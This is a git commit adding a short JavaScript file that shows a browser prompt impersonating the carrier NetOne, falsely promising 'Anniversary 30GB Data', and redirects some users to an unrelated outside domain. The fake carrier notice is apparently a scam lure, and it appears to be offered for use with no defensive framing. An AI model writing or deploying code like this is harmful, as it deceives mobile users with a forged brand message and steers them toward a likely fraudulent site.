d28aaa3ed51856155e6cacea062160ffd34d00e3
churchbro <herds-piping-1c@icloud.com>
2026-08-14 13:43:39 -1200

    Add script for 30GB data activation prompt

---
+++ 30gb.js
@@ -0,0 +1,5 @@
+    var password = 'Anniversary 30GB Data'
+password=prompt('NetOne: Congratulations, your Mobile Number is eligible to receive  Anniversary 30GB Data, click OK to Activate now','Anniversary 30GB Data');
+if (password != 'Anniversary 30GB Data') {
+location.href='https://www.akpanbernard.fit/30gb';
+}
